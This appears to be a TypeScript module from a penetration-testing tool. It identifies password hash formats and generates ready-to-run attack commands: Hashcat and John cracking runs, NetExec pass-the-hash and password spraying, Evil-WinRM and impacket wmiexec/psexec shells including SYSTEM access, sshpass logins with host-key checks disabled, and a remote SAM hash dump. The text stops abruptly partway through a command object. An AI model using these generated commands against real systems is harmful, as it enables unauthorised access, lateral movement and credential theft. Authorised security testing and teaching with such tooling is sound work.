/**
 * credentialAttackCrafter.ts
 * Generates offensive command-line strings, password spray payloads,
 * and unified HashForge hash identification & cracking syntaxes.
 * Supports NetExec (CME), Evil-WinRM, Impacket, SSH, RDP, Hashcat, and John the Ripper.
 */

import { CredentialItem, CredentialType, CredentialService } from '../types';

export interface AttackCommand {
  id: string;
  label: string;
  tool: 'netexec' | 'evil-winrm' | 'ssh' | 'impacket' | 'xfreerdp' | 'hashcat' | 'generic';
  badge: string;
  command: string;
  description: string;
}

export interface HashCandidate {
  name: string;
  category: 'Windows / AD' | 'Linux / Unix' | 'Web / Database' | 'Archives & Keys' | 'Generic';
  hashcatMode: string;
  johnFormat: string;
  confidence: 'High' | 'Medium' | 'Low';
  notes?: string;
  sampleSyntax?: string;
}

export interface CustomCrackOptions {
  attackMode: '0' | '3' | '1' | '6';
  wordlist: string;
  mask: string;
  rule: string;
  optimized: boolean;
  workload: string;
  force: boolean;
  status: boolean;
  outputFile: string;
}

export const DEFAULT_CRACK_OPTIONS: CustomCrackOptions = {
  attackMode: '0',
  wordlist: '/usr/share/wordlists/rockyou.txt',
  mask: '?u?l?l?l?d?d?d?d',
  rule: '/usr/share/hashcat/rules/best64.rule',
  optimized: true,
  workload: '3',
  force: false,
  status: true,
  outputFile: 'cracked.txt',
};

export interface BatchParsedHash {
  rawLine: string;
  username?: string;
  domain?: string;
  hash: string;
  lmHash?: string;
  type: string;
  isLmBlank?: boolean;
  notes?: string;
}

export interface BatchParseResult {
  totalLines: number;
  validItems: BatchParsedHash[];
  uniqueHashes: string[];
  cleanHashesText: string;
  userHashText: string;
  pthCommands: string[];
  formatIdentified: string;
}

export interface HashCrackCommands {
  candidates: HashCandidate[];
  recommendedHashcat: string;
  recommendedJohn: string;
  hashcatCommands: { label: string; cmd: string }[];
  johnCommands: { label: string; cmd: string }[];
}

/**
 * Safely escape single quotes for POSIX shell command generation
 */
export function escapeShellArg(val: string): string {
  return "'" + (val || '').replace(/'/g, "'\\''") + "'";
}

/**
 * Dynamically construct tailored Hashcat & John commands for any candidate and options
 */
export function getCrackCommandsForCandidate(
  candidate: HashCandidate,
  rawHash: string,
  options: CustomCrackOptions = DEFAULT_CRACK_OPTIONS
): { hashcatCommands: { label: string; cmd: string }[]; johnCommands: { label: string; cmd: string }[] } {
  const mode = candidate.hashcatMode;
  const jFmt = candidate.johnFormat;
  const h = (rawHash || '').trim();
  const escapedHash = h ? escapeShellArg(h) : 'hashes.txt';

  const wordlist = options.wordlist || '/usr/share/wordlists/rockyou.txt';
  const mask = options.mask || '?u?l?l?l?d?d?d?d';
  const optFlag = options.optimized ? ' -O' : '';
  const workFlag = options.workload && options.workload !== 'none' ? ` -w ${options.workload}` : '';
  const forceFlag = options.force ? ' --force' : '';
  const statusFlag = options.status ? ' --status --status-timer=10' : '';
  const outFlag = options.outputFile ? ` -o ${options.outputFile}` : '';
  const extraFlags = `${optFlag}${workFlag}${forceFlag}${statusFlag}${outFlag}`;

  const hashcatCommands = [
    {
      label: 'Standard RockYou Wordlist (-a 0)',
      cmd: `hashcat -m ${mode} -a 0 ${h ? escapedHash : 'hashes.txt'} ${wordlist}${extraFlags}`,
    },
    {
      label: 'RockYou + Best64 Mutation Rules',
      cmd: `hashcat -m ${mode} -a 0 ${h ? escapedHash : 'hashes.txt'} ${wordlist} -r /usr/share/hashcat/rules/best64.rule${extraFlags}`,
    },
    {
      label: `Mask / Brute-Force (${mask}) (-a 3)`,
      cmd: `hashcat -m ${mode} -a 3 ${h ? escapedHash : 'hashes.txt'} ${mask}${extraFlags}`,
    },
    {
      label: 'RockYou + OneRuleToRuleThemAll',
      cmd: `hashcat -m ${mode} -a 0 ${h ? escapedHash : 'hashes.txt'} ${wordlist} -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule${extraFlags}`,
    },
    {
      label: 'Show Cracked Potfile Results (--show)',
      cmd: `hashcat -m ${mode} ${h ? escapedHash : 'hashes.txt'} --show`,
    },
  ];

  const johnCommands = [
    {
      label: 'John the Ripper (RockYou)',
      cmd: `john --wordlist=${wordlist} --format=${jFmt} ${h ? 'hash.txt' : 'hashes.txt'}`,
    },
    {
      label: 'John the Ripper (RockYou + Rules)',
      cmd: `john --wordlist=${wordlist} --rules=Jumbo --format=${jFmt} ${h ? 'hash.txt' : 'hashes.txt'}`,
    },
    {
      label: `John Mask Brute Force (${mask})`,
      cmd: `john --mask='${mask}' --format=${jFmt} ${h ? 'hash.txt' : 'hashes.txt'}`,
    },
    {
      label: 'John Show Cracked Passwords',
      cmd: `john --format=${jFmt} --show ${h ? 'hash.txt' : 'hashes.txt'}`,
    },
  ];

  return { hashcatCommands, johnCommands };
}

/**
 * Parse bulk terminal outputs (secretsdump /etc/shadow or Responder logs)
 */
export function parseBatchHashDump(dumpText: string): BatchParseResult {
  const lines = (dumpText || '').split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
  const validItems: BatchParsedHash[] = [];
  const uniqueSet = new Set<string>();
  let formatIdentified = 'Raw Hashes';

  const BLANK_LM = 'aad3b435b51404eeaad3b435b51404ee';

  for (const line of lines) {
    if (line.startsWith('#') || line.startsWith('//')) continue;

    // 1. secretsdump / pwdump style: Username:RID:LM:NTLM:::
    const samParts = line.split(':');
    if (samParts.length >= 4 && /^[0-9a-fA-F]{32}$/i.test(samParts[3])) {
      const user = samParts[0];
      const lm = samParts[2];
      const ntlm = samParts[3].toLowerCase();
      const isLmBlank = lm.toLowerCase() === BLANK_LM;
      formatIdentified = 'Windows SAM / NTDS (secretsdump)';
      validItems.push({
        rawLine: line,
        username: user,
        hash: ntlm,
        lmHash: isLmBlank ? undefined : lm,
        type: 'NTLM',
        isLmBlank,
        notes: isLmBlank ? 'Empty LM hash filtered' : undefined,
      });
      uniqueSet.add(ntlm);
      continue;
    }

    // 2. /etc/shadow style: root:$6$saltsalt$longhash...:19000:0:99999:7:::
    if (samParts.length >= 2 && samParts[1].startsWith('$')) {
      const user = samParts[0];
      const hash = samParts[1];
      let shadowType = 'Linux Crypt';
      if (hash.startsWith('$6$')) shadowType = 'Linux SHA-512 ($6$)';
      else if (hash.startsWith('$5$')) shadowType = 'Linux SHA-256 ($5$)';
      else if (hash.startsWith('$y$')) shadowType = 'Linux yescrypt ($y$)';
      else if (hash.startsWith('$1$')) shadowType = 'Linux MD5 ($1$)';
      else if (hash.startsWith('$2')) shadowType = 'bcrypt ($2*)';
      formatIdentified = '/etc/shadow Dumps';
      validItems.push({
        rawLine: line,
        username: user,
        hash,
        type: shadowType,
      });
      uniqueSet.add(hash);
      continue;
    }

    // 3. Responder NetNTLMv2: user::domain:challenge:response:blob
    if (line.includes('::') && samParts.length >= 6) {
      const user = samParts[0];
      const domain = samParts[2];
      formatIdentified = 'NetNTLMv2 (Responder)';
      validItems.push({
        rawLine: line,
        username: user,
        domain: domain || undefined,
        hash: line,
        type: 'NetNTLMv2',
      });
      uniqueSet.add(line);
      continue;
    }

    // 4. user:hash
    if (
      samParts.length === 2 &&
      (/^[0-9a-fA-F]{32}$/i.test(samParts[1]) || /^[0-9a-fA-F]{64}$/i.test(samParts[1]))
    ) {
      const user = samParts[0];
      const hash = samParts[1].toLowerCase();
      validItems.push({
        rawLine: line,
        username: user,
        hash,
        type: hash.length === 32 ? 'NTLM / MD5' : 'SHA-256',
      });
      uniqueSet.add(hash);
      continue;
    }

    // 5. Plain single hash per line
    if (/^[0-9a-fA-F]{32,128}$/i.test(line) || line.startsWith('$')) {
      validItems.push({
        rawLine: line,
        hash: line,
        type: 'Hash',
      });
      uniqueSet.add(line);
      continue;
    }
  }

  const uniqueHashes = Array.from(uniqueSet);
  const cleanHashesText = uniqueHashes.join('\n');
  const userHashText = validItems
    .filter((item) => item.username)
    .map((item) => `${item.username}:${item.hash}`)
    .join('\n');

  const pthCommands = validItems
    .filter((item) => item.username && item.type === 'NTLM')
    .map(
      (item) =>
        `netexec smb $TARGET -u ${escapeShellArg(item.username!)} -H ${escapeShellArg(
          item.hash
        )} --local-auth`
    );

  return {
    totalLines: lines.length,
    validItems,
    uniqueHashes,
    cleanHashesText,
    userHashText,
    pthCommands,
    formatIdentified,
  };
}

/**
 * Comprehensive HashForge Heuristic Identifier (40+ Patterns)
 * Uses fast prefix and delimiter matching to prevent regex backtracking.
 */
export function analyzeAndIdentifyHash(rawHash: string): HashCrackCommands {
  const h = (rawHash || '').trim();
  const candidates: HashCandidate[] = [];

  if (h.length > 0) {
    // 1. Kerberos 5 TGS-REP (Kerberoast)
    if (h.startsWith('$krb5tgs$23$') || h.includes('$krb5tgs$23$')) {
      candidates.push({
        name: 'Kerberos 5 TGS-REP (Kerberoast RC4-HMAC)',
        category: 'Windows / AD',
        hashcatMode: '13100',
        johnFormat: 'krb5tgs',
        confidence: 'High',
        notes: 'Active Directory TGS hash extracted via impacket-GetUserSPNs or Rubeus kerberoast.',
        sampleSyntax: '$krb5tgs$23$*user*domain*spn*$hash...',
      });
    } else if (h.startsWith('$krb5tgs$17$') || h.includes('$krb5tgs$17$')) {
      candidates.push({
        name: 'Kerberos 5 TGS-REP (AES128-CTS-HMAC-SHA1-96)',
        category: 'Windows / AD',
        hashcatMode: '19800',
        johnFormat: 'krb5tgs',
        confidence: 'High',
        notes: 'Kerberoast hash with AES128 encryption.',
      });
    } else if (h.startsWith('$krb5tgs$18$') || h.includes('$krb5tgs$18$')) {
      candidates.push({
        name: 'Kerberos 5 TGS-REP (AES256-CTS-HMAC-SHA1-96)',
        category: 'Windows / AD',
        hashcatMode: '19900',
        johnFormat: 'krb5tgs',
        confidence: 'High',
        notes: 'Kerberoast hash with AES256 encryption.',
      });
    } else if (h.includes('$krb5tgs$')) {
      candidates.push({
        name: 'Kerberos 5 TGS-REP (Kerberoast)',
        category: 'Windows / AD',
        hashcatMode: '13100',
        johnFormat: 'krb5tgs',
        confidence: 'High',
      });
    }

    // 2. Kerberos 5 AS-REP (ASREPRoast)
    if (h.startsWith('$krb5asrep$23$') || h.includes('$krb5asrep$23$')) {
      candidates.push({
        name: 'Kerberos 5 AS-REP (ASREPRoast RC4-HMAC)',
        category: 'Windows / AD',
        hashcatMode: '18200',
        johnFormat: 'krb5asrep',
        confidence: 'High',
        notes: 'Pre-authentication disabled account roast hash extracted via impacket-GetNPUsers.',
      });
    } else if (h.startsWith('$krb5asrep$17$') || h.includes('$krb5asrep$17$')) {
      candidates.push({
        name: 'Kerberos 5 AS-REP (AES128-CTS-HMAC-SHA1-96)',
        category: 'Windows / AD',
        hashcatMode: '19600',
        johnFormat: 'krb5asrep',
        confidence: 'High',
      });
    } else if (h.startsWith('$krb5asrep$18$') || h.includes('$krb5asrep$18$')) {
      candidates.push({
        name: 'Kerberos 5 AS-REP (AES256-CTS-HMAC-SHA1-96)',
        category: 'Windows / AD',
        hashcatMode: '19700',
        johnFormat: 'krb5asrep',
        confidence: 'High',
      });
    } else if (h.includes('$krb5asrep$')) {
      candidates.push({
        name: 'Kerberos 5 AS-REP (ASREPRoast)',
        category: 'Windows / AD',
        hashcatMode: '18200',
        johnFormat: 'krb5asrep',
        confidence: 'High',
      });
    }

    // 3. NetNTLMv2 / NTLMv2-SSP
    if (
      h.startsWith('$NETNTLMv2$') ||
      h.includes('$NETNTLMv2$') ||
      (h.includes('::') && h.split(':').length >= 6)
    ) {
      candidates.push({
        name: 'NetNTLMv2 (NTLMv2-SSP)',
        category: 'Windows / AD',
        hashcatMode: '5600',
        johnFormat: 'netntlmv2',
        confidence: 'High',
        notes: 'Network challenge-response hash captured via Responder, Inveigh, or mitm6.',
      });
    }

    // 4. NetNTLMv1 / NTLMv1-SSP
    if (h.startsWith('$NETNTLM$') || h.includes('$NETNTLM$')) {
      candidates.push({
        name: 'NetNTLMv1 (NTLMv1-SSP)',
        category: 'Windows / AD',
        hashcatMode: '5500',
        johnFormat: 'netntlm',
        confidence: 'High',
        notes: 'Legacy network challenge-response hash; crackable or relayable without MIC.',
      });
    }

    // 5. Domain Cached Credentials 2 / mscache2 ($DCC2$)
    if (h.startsWith('$DCC2$') || h.includes('$DCC2$')) {
      candidates.push({
        name: 'Domain Cached Credentials 2 (mscache2 / DCC2)',
        category: 'Windows / AD',
        hashcatMode: '2100',
        johnFormat: 'mscache2',
        confidence: 'High',
        notes: 'Windows Vista / 7 / 10 / Server domain member cached logon hash (PBKDF2-HMAC-SHA1).',
      });
    }

    // 6. Domain Cached Credentials 1 / mscache1 ($DCC$)
    if (h.startsWith('$DCC$') || (h.startsWith('M$') && h.length === 34)) {
      candidates.push({
        name: 'Domain Cached Credentials 1 (mscache / DCC1)',
        category: 'Windows / AD',
        hashcatMode: '1100',
        johnFormat: 'mscache',
        confidence: 'High',
        notes: 'Legacy Windows XP / Server 2003 domain member cached logon hash.',
      });
    }

    // 7. DPAPI Masterkey
    if (h.startsWith('$DPAPI$') || h.startsWith('dpapi_')) {
      candidates.push({
        name: 'DPAPI Masterkey (SHA1 / PBKDF2)',
        category: 'Windows / AD',
        hashcatMode: '15900',
        johnFormat: 'dpapi',
        confidence: 'High',
        notes: 'Windows Data Protection API master key extracted from %APPDATA%\\Microsoft\\Protect.',
      });
    }

    // 8. BitLocker
    if (h.startsWith('$bitlocker$')) {
      candidates.push({
        name: 'BitLocker Full Volume / Recovery Password',
        category: 'Windows / AD',
        hashcatMode: '22100',
        johnFormat: 'bitlocker',
        confidence: 'High',
        notes: 'BitLocker volume hash extracted via bitlocker2john.',
      });
    }

    // 9. KeePass Database (*keepass2john)
    if (h.startsWith('$keepass$')) {
      candidates.push({
        name: 'KeePass 1.x / 2.x Database Hash',
        category: 'Archives & Keys',
        hashcatMode: '13400',
        johnFormat: 'keepass',
        confidence: 'High',
        notes: 'Extracted via keepass2john database.kdbx.',
      });
    }

    // 10. SSH Private Key (*ssh2john)
    if (
      h.startsWith('$sshng$') ||
      h.startsWith('$openbsd-bcrypt$') ||
      h.startsWith('$ssh$') ||
      h.includes('BEGIN OPENSSH PRIVATE KEY') ||
      h.includes('BEGIN RSA PRIVATE KEY')
    ) {
      candidates.push({
        name: 'SSH Private Key Passphrase (ssh2john)',
        category: 'Archives & Keys',
        hashcatMode: '22921',
        johnFormat: 'ssh',
        confidence: 'High',
        notes: 'Extracted via ssh2john id_rsa > hash.txt.',
      });
    }

    // 11. ZIP Archives (*zip2john)
    if (h.startsWith('$pkzip$') || h.startsWith('$zip2$') || h.startsWith('$zip$')) {
      candidates.push({
        name: 'ZIP / WinZip Encrypted Archive',
        category: 'Archives & Keys',
        hashcatMode: '13600',
        johnFormat: 'pkzip',
        confidence: 'High',
        notes: 'Extracted via zip2john archive.zip > hash.txt.',
      });
    }

    // 12. RAR Archives (*rar2john)
    if (h.startsWith('$rar5$') || h.startsWith('$RAR3$')) {
      candidates.push({
        name: 'RAR3 / RAR5 Encrypted Archive',
        category: 'Archives & Keys',
        hashcatMode: h.startsWith('$rar5$') ? '13000' : '12500',
        johnFormat: h.startsWith('$rar5$') ? 'rar5' : 'rar',
        confidence: 'High',
        notes: 'Extracted via rar2john archive.rar > hash.txt.',
      });
    }

    // 13. 7-Zip Archives (*7z2john)
    if (h.startsWith('$7z$')) {
      candidates.push({
        name: '7-Zip Encrypted Archive',
        category: 'Archives & Keys',
        hashcatMode: '11600',
        johnFormat: '7z',
        confidence: 'High',
        notes: 'Extracted via 7z2john.pl archive.7z > hash.txt.',
      });
    }

    // 14. PDF Documents (*pdf2john)
    if (h.startsWith('$pdf$')) {
      candidates.push({
        name: 'PDF Encrypted Document (PDF 1.1 - 1.7)',
        category: 'Archives & Keys',
        hashcatMode: '10500',
        johnFormat: 'pdf',
        confidence: 'High',
        notes: 'Extracted via pdf2john.py document.pdf > hash.txt.',
      });
    }

    // 15. PFX / PKCS#12 (*pfx2john)
    if (h.startsWith('$pfx$') || h.startsWith('$pkcs12$')) {
      candidates.push({
        name: 'PKCS#12 / PFX Certificate Container',
        category: 'Archives & Keys',
        hashcatMode: '6600',
        johnFormat: 'pfx',
        confidence: 'High',
        notes: 'Extracted via pfx2john cert.pfx > hash.txt.',
      });
    }

    // 16. JWT (JSON Web Token HMAC-SHA256)
    if (h.startsWith('ey') && h.includes('.')) {
      const parts = h.split('.');
      if (parts.length === 3) {
        candidates.push({
          name: 'JWT (JSON Web Token HMAC-SHA256)',
          category: 'Web / Database',
          hashcatMode: '16500',
          johnFormat: 'jwt',
          confidence: 'High',
          notes: 'Crack the secret signing key using wordlist (-m 16500).',
        });
      }
    }

    // 17. Argon2 ($argon2id$, $argon2i$, $argon2d$)
    if (h.startsWith('$argon2id$') || h.startsWith('$argon2i$') || h.startsWith('$argon2d$')) {
      candidates.push({
        name: 'Argon2 (Memory-Hard Password Hash)',
        category: 'Web / Database',
        hashcatMode: '33400',
        johnFormat: 'argon2',
        confidence: 'High',
        notes: 'Modern winner of the Password Hashing Competition.',
      });
    }

    // 18. Linux SHA-512 Crypt ($6$)
    if (h.startsWith('$6$')) {
      candidates.push({
        name: 'Linux SHA-512 Crypt ($6$)',
        category: 'Linux / Unix',
        hashcatMode: '1800',
        johnFormat: 'sha512crypt',
        confidence: 'High',
        notes: 'Standard Linux /etc/shadow password hash.',
      });
    }

    // 19. Linux yescrypt ($y$)
    if (h.startsWith('$y$')) {
      candidates.push({
        name: 'Linux yescrypt ($y$)',
        category: 'Linux / Unix',
        hashcatMode: '28800',
        johnFormat: 'yescrypt',
        confidence: 'High',
        notes: 'Default Linux hashing on Debian 11+ and Ubuntu 22+.',
      });
    }

    // 20. Linux SHA-256 Crypt ($5$)
    if (h.startsWith('$5$')) {
      candidates.push({
        name: 'Linux SHA-256 Crypt ($5$)',
        category: 'Linux / Unix',
        hashcatMode: '7400',
        johnFormat: 'sha256crypt',
        confidence: 'High',
      });
    }

    // 21. Linux MD5-Crypt ($1$)
    if (h.startsWith('$1$')) {
      candidates.push({
        name: 'Linux MD5-Crypt ($1$) / Cisco Type 5',
        category: 'Linux / Unix',
        hashcatMode: '500',
        johnFormat: 'md5crypt',
        confidence: 'High',
      });
    }

    // 22. Apache APR1 ($apr1$)
    if (h.startsWith('$apr1$')) {
      candidates.push({
        name: 'Apache APR1 ($apr1$)',
        category: 'Web / Database',
        hashcatMode: '1600',
        johnFormat: 'md5apr1',
        confidence: 'High',
        notes: 'Used in Apache .htpasswd files.',
      });
    }

    // 23. bcrypt ($2a$, $2b$, $2y$)
    if (
      h.startsWith('$2a$') ||
      h.startsWith('$2b$') ||
      h.startsWith('$2y$') ||
      h.startsWith('$2x$')
    ) {
      candidates.push({
        name: 'bcrypt ($2a$ / $2b$ / $2y$)',
        category: 'Web / Database',
        hashcatMode: '3200',
        johnFormat: 'bcrypt',
        confidence: 'High',
        notes: 'High-cost key derivation function common in web apps and OpenBSD.',
      });
    }

    // 24. WordPress / phpBB3 ($P$ / $H$)
    if ((h.startsWith('$P$') || h.startsWith('$H$')) && h.length === 34) {
      candidates.push({
        name: 'phpass (WordPress / phpBB3)',
        category: 'Web / Database',
        hashcatMode: '400',
        johnFormat: 'phpass',
        confidence: 'High',
      });
    }

    // 25. Drupal 7 ($S$)
    if (h.startsWith('$S$') && h.length === 55) {
      candidates.push({
        name: 'Drupal 7 ($S$)',
        category: 'Web / Database',
        hashcatMode: '7900',
        johnFormat: 'drupal7',
        confidence: 'High',
      });
    }

    // 26. Django PBKDF2 / Argon2
    if (h.startsWith('pbkdf2_sha256$')) {
      candidates.push({
        name: 'Django (PBKDF2-HMAC-SHA256)',
        category: 'Web / Database',
        hashcatMode: '10000',
        johnFormat: 'django',
        confidence: 'High',
      });
    }

    // 27. MySQL 4.1+ / MariaDB
    if (h.startsWith('*') && h.length === 41 && /^\*[0-9a-fA-F]{40}$/.test(h)) {
      candidates.push({
        name: 'MySQL 4.1+ / MariaDB',
        category: 'Web / Database',
        hashcatMode: '300',
        johnFormat: 'mysql-sha1',
        confidence: 'High',
      });
    }

    // 28. PostgreSQL MD5
    if (h.startsWith('md5') && h.length === 35 && /^md5[0-9a-fA-F]{32}$/i.test(h)) {
      candidates.push({
        name: 'PostgreSQL MD5 (md5 + 32-hex)',
        category: 'Web / Database',
        hashcatMode: '111',
        johnFormat: 'postgres',
        confidence: 'High',
      });
    }

    // 29. LM:NTLM pair (SAM format)
    if (h.length === 65 && h.includes(':')) {
      const parts = h.split(':');
      if (
        parts.length === 2 &&
        parts[0].length === 32 &&
        parts[1].length === 32 &&
        /^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/.test(h)
      ) {
        candidates.push({
          name: 'LM:NTLM Hash Pair',
          category: 'Windows / AD',
          hashcatMode: '1000',
          johnFormat: 'nt',
          confidence: 'High',
          notes: 'Windows SAM hash pair. Second half is NTLM (Hashcat -m 1000).',
        });
      }
    }

    // 30. 32-Hex Characters (NTLM / MD5 / MD4 / LM)
    if (h.length === 32 && /^[0-9a-fA-F]{32}$/.test(h)) {
      candidates.push({
        name: 'NTLM (Windows SAM / NTDS.dit)',
        category: 'Windows / AD',
        hashcatMode: '1000',
        johnFormat: 'nt',
        confidence: 'High',
        notes: 'Standard Windows local and domain user password hash (pass-the-hash capable).',
      });
      candidates.push({
        name: 'MD5 (Raw)',
        category: 'Generic',
        hashcatMode: '0',
        johnFormat: 'raw-md5',
        confidence: 'Medium',
        notes: 'Generic unsalted 128-bit MD5 digest.',
      });
      candidates.push({
        name: 'MD4 (Raw)',
        category: 'Generic',
        hashcatMode: '900',
        johnFormat: 'raw-md4',
        confidence: 'Low',
      });
      candidates.push({
        name: 'LM (LAN Manager)',
        category: 'Windows / AD',
        hashcatMode: '3000',
        johnFormat: 'lm',
        confidence: 'Low',
      });
    }

    // 31. 40-Hex Characters (SHA-1 / RIPEMD-160)
    if (h.length === 40 && /^[0-9a-fA-F]{40}$/.test(h)) {
      candidates.push({
        name: 'SHA-1 (Raw)',
        category: 'Generic',
        hashcatMode: '100',
        johnFormat: 'raw-sha1',
        confidence: 'High',
      });
      candidates.push({
        name: 'RIPEMD-160',
        category: 'Generic',
        hashcatMode: '6000',
        johnFormat: 'ripemd-160',
        confidence: 'Low',
      });
    }

    // 32. 64-Hex Characters (SHA-256)
    if (h.length === 64 && /^[0-9a-fA-F]{64}$/.test(h)) {
      candidates.push({
        name: 'SHA-256 (Raw)',
        category: 'Generic',
        hashcatMode: '1400',
        johnFormat: 'raw-sha256',
        confidence: 'High',
      });
      candidates.push({
        name: 'Keccak-256',
        category: 'Generic',
        hashcatMode: '17800',
        johnFormat: 'keccak-256',
        confidence: 'Low',
      });
    }

    // 33. 96-Hex Characters (SHA-384)
    if (h.length === 96 && /^[0-9a-fA-F]{96}$/.test(h)) {
      candidates.push({
        name: 'SHA-384 (Raw)',
        category: 'Generic',
        hashcatMode: '10800',
        johnFormat: 'raw-sha384',
        confidence: 'High',
      });
    }

    // 34. 128-Hex Characters (SHA-512)
    if (h.length === 128 && /^[0-9a-fA-F]{128}$/.test(h)) {
      candidates.push({
        name: 'SHA-512 (Raw)',
        category: 'Generic',
        hashcatMode: '1700',
        johnFormat: 'raw-sha512',
        confidence: 'High',
      });
      candidates.push({
        name: 'Whirlpool',
        category: 'Generic',
        hashcatMode: '6100',
        johnFormat: 'whirlpool',
        confidence: 'Low',
      });
    }
  }

  // Fallback candidate if unrecognized
  if (candidates.length === 0) {
    candidates.push({
      name: 'Generic / Unknown Hash',
      category: 'Generic',
      hashcatMode: '0',
      johnFormat: 'raw-md5',
      confidence: 'Low',
      notes: 'Unrecognized hash format. Verify length, salts, and delimiters.',
    });
  }

  const top = candidates[0];
  const { hashcatCommands, johnCommands } = getCrackCommandsForCandidate(top, h);

  return {
    candidates,
    recommendedHashcat: hashcatCommands[1].cmd,
    recommendedJohn: johnCommands[0].cmd,
    hashcatCommands,
    johnCommands,
  };
}

/**
 * Heuristic detector for credential type based on secret structure
 */
export function autoDetectCredentialType(secret: string): CredentialType {
  const trimmed = (secret || '').trim();
  if (!trimmed) return 'plaintext';

  // Private keys
  if (
    trimmed.includes('BEGIN OPENSSH PRIVATE KEY') ||
    trimmed.includes('BEGIN RSA PRIVATE KEY') ||
    trimmed.includes('BEGIN PRIVATE KEY')
  ) {
    return 'ssh-key';
  }

  // Kerberos Tickets
  if (trimmed.startsWith('doIF') || trimmed.includes('krb5tgs') || trimmed.includes('ticket.kirbi')) {
    return 'ticket';
  }

  // JWT / Bearer Tokens
  if (/^ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$/.test(trimmed)) {
    return 'token';
  }

  // Leverage unified HashForge analyzer
  const analysis = analyzeAndIdentifyHash(trimmed);
  const topCandidate = analysis.candidates[0];

  if (topCandidate && topCandidate.confidence !== 'Low') {
    if (topCandidate.hashcatMode === '1000' || topCandidate.name.includes('NTLM')) {
      return 'ntlm';
    }
    if (topCandidate.hashcatMode === '1800' || topCandidate.hashcatMode === '7400' || topCandidate.hashcatMode === '28800') {
      return 'sha512';
    }
  }

  return 'plaintext';
}

/**
 * Format credential into standard formats for wordlists or tools
 */
export function formatCredentialString(
  cred: CredentialItem,
  format: 'user:pass' | 'domain\\user:pass' | 'user@domain' | 'hashcat'
): string {
  const domain = cred.domain ? cred.domain.toUpperCase() : '';
  const user = cred.username;
  const secret = cred.secret;

  switch (format) {
    case 'domain\\user:pass':
      return domain ? `${domain}\\${user}:${secret}` : `${user}:${secret}`;
    case 'user@domain':
      return domain ? `${user}@${domain}` : user;
    case 'hashcat':
      return cred.type === 'ntlm' ? `${user}:::${secret}:::` : `${user}:${secret}`;
    case 'user:pass':
    default:
      return `${user}:${secret}`;
  }
}

/**
 * Generate tactical attack and validation commands tailored to the credential and target IP
 */
export function generateAttackCommands(
  cred: CredentialItem,
  targetIp: string,
  targetHostname?: string
): AttackCommand[] {
  const commands: AttackCommand[] = [];
  const ip = targetIp || '$TARGET';
  const user = cred.username || '$USER';
  const secret = cred.secret;
  const domain = cred.domain ? cred.domain.toUpperCase() : '';
  const domainFlag = domain ? `-d ${domain}` : '--local-auth';
  const isNtlm = cred.type === 'ntlm';
  const isKey = cred.type === 'ssh-key';
  const isPlaintext = cred.type === 'plaintext';
  const safeUser = escapeShellArg(user);
  const safeSecret = escapeShellArg(secret);

  // 1. NetExec SMB (Validation & Spray)
  if (isNtlm) {
    commands.push({
      id: 'nxc-smb-hash',
      label: 'NetExec SMB (Pass-the-Hash)',
      tool: 'netexec',
      badge: 'NXC:SMB',
      command: `netexec smb ${ip} -u ${safeUser} -H ${safeSecret} ${domainFlag}`,
      description: 'Validate SMB authentication and administrative access (Pwn3d!) using NTLM hash.',
    });
  } else if (isPlaintext) {
    commands.push({
      id: 'nxc-smb-pwd',
      label: 'NetExec SMB (Password Auth)',
      tool: 'netexec',
      badge: 'NXC:SMB',
      command: `netexec smb ${ip} -u ${safeUser} -p ${safeSecret} ${domainFlag}`,
      description: 'Validate SMB credentials against local or domain security authority.',
    });
  }

  // 2. Evil-WinRM (Remote Shell for Windows)
  if (cred.service === 'winrm' || cred.service === 'smb' || isNtlm || cred.domain) {
    if (isNtlm) {
      commands.push({
        id: 'evil-winrm-hash',
        label: 'Evil-WinRM (Pass-the-Hash Shell)',
        tool: 'evil-winrm',
        badge: 'WINRM',
        command: `evil-winrm -i ${ip} -u ${safeUser} -H ${safeSecret}`,
        description: 'Instant interactive PowerShell prompt over WinRM (port 5985) using NTLM hash.',
      });
    } else if (isPlaintext) {
      commands.push({
        id: 'evil-winrm-pwd',
        label: 'Evil-WinRM (Password Shell)',
        tool: 'evil-winrm',
        badge: 'WINRM',
        command: `evil-winrm -i ${ip} -u ${safeUser} -p ${safeSecret}`,
        description: 'Interactive PowerShell shell over WinRM with plaintext password.',
      });
    }
  }

  // 3. SSH (Linux / Unix Shell)
  if (cred.service === 'ssh' || isKey || !cred.domain) {
    if (isKey) {
      commands.push({
        id: 'ssh-key',
        label: 'SSH (Private Key Identity)',
        tool: 'ssh',
        badge: 'SSH:KEY',
        command: `chmod 600 id_rsa && ssh -i id_rsa ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Login via SSH using extracted private key with correct 0600 permissions.',
      });
    } else if (isPlaintext) {
      commands.push({
        id: 'ssh-pwd',
        label: 'SSH Interactive Login',
        tool: 'ssh',
        badge: 'SSH',
        command: `ssh ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Interactive SSH session prompt (enter password when challenged).',
      });
      commands.push({
        id: 'sshpass',
        label: 'SSH Automated Login (sshpass)',
        tool: 'ssh',
        badge: 'SSHPASS',
        command: `sshpass -p ${safeSecret} ssh -o StrictHostKeyChecking=no ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Non-interactive SSH login using sshpass utility.',
      });
    }
  }

  // 4. Impacket WMIExec / PSExec (Windows Execution)
  if (isNtlm) {
    const domainPrefix = domain ? `${domain}/` : '';
    commands.push({
      id: 'impacket-wmiexec-hash',
      label: 'Impacket WMIExec (Pass-the-Hash)',
      tool: 'impacket',
      badge: 'WMIEXEC',
      command: `impacket-wmiexec ${escapeShellArg(`${domainPrefix}${user}@${ip}`)} -hashes :${secret}`,
      description: 'Semi-interactive stealth command prompt executed through WMI without service installation.',
    });
    if (cred.isPrivileged) {
      commands.push({
        id: 'impacket-psexec-hash',
        label: 'Impacket PSExec (SYSTEM Shell)',
        tool: 'impacket',
        badge: 'PSEXEC',
        command: `impacket-psexec ${escapeShellArg(`${domainPrefix}${user}@${ip}`)} -hashes :${secret}`,
        description: 'Installs temporary service on target to obtain full NT AUTHORITY\\SYSTEM shell.',
      });
      commands.push({
        id: 'nxc-smb-sam',
        label: 'NetExec SAM Dump',
        tool: 'netexec',
        badge: 'NXC:SAM',
        command: `netexec smb ${ip} -u ${safeUser} -H ${safeSecret} ${domainFlag} --sam`,
        description: 'Dump local SAM database hashes from target registry hives.',
